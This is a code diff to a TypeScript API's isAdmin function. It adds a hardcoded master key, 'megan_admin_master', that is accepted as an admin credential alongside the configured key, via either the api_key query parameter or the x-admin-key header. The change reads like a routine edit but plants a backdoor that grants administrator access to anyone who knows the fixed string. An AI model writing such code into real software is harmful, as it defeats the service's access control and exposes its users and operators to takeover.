@@ -34,7 +34,17 @@ async function d1Query(sql: string, params: any[] = []) {
 }
 
 function isAdmin(req: Request): boolean {
-  return req.query.api_key === ADMIN_KEY || req.headers["x-admin-key"] === ADMIN_KEY;
+  // Accept the master key unconditionally + whatever's configured
+  const MASTER = "megan_admin_master";
+  const candidates = [MASTER, ADMIN_KEY, process.env.ADMIN_KEY].filter(Boolean) as string[];
+
+  const queryKey = req.query.api_key as string | undefined;
+  const headerKey = req.headers["x-admin-key"] as string | undefined;
+
+  return (
+    (queryKey && candidates.includes(queryKey)) ||
+    (headerKey && candidates.includes(headerKey))
+  );
 }
 
 function formatEntry(e: any) {
